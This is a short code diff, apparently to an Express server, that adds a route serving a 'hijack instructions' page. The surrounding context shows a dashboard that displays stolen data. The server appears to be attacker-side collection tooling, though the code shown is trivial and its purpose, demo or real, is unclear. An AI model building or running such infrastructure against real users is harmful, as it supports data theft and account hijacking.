@@ -146,6 +146,15 @@ function generateDataItemsHTML() {
   }).join('');
 }
 
+// ===== HIJACK INSTRUCTIONS PAGE =====
+// Serves static instruction page with URL parameters
+app.get('/hijack-instructions', (req, res) => {
+  // Read the static HTML file and send it directly
+  // The client-side JavaScript will parse URL parameters
+  const html = fs.readFileSync(path.join(__dirname, 'views', 'hijack-instructions.html'), 'utf-8');
+  res.send(html);
+});
+
 // ===== DASHBOARD ENDPOINT =====
 // Shows all stolen data in a web interface
 app.get('/', (req, res) => {
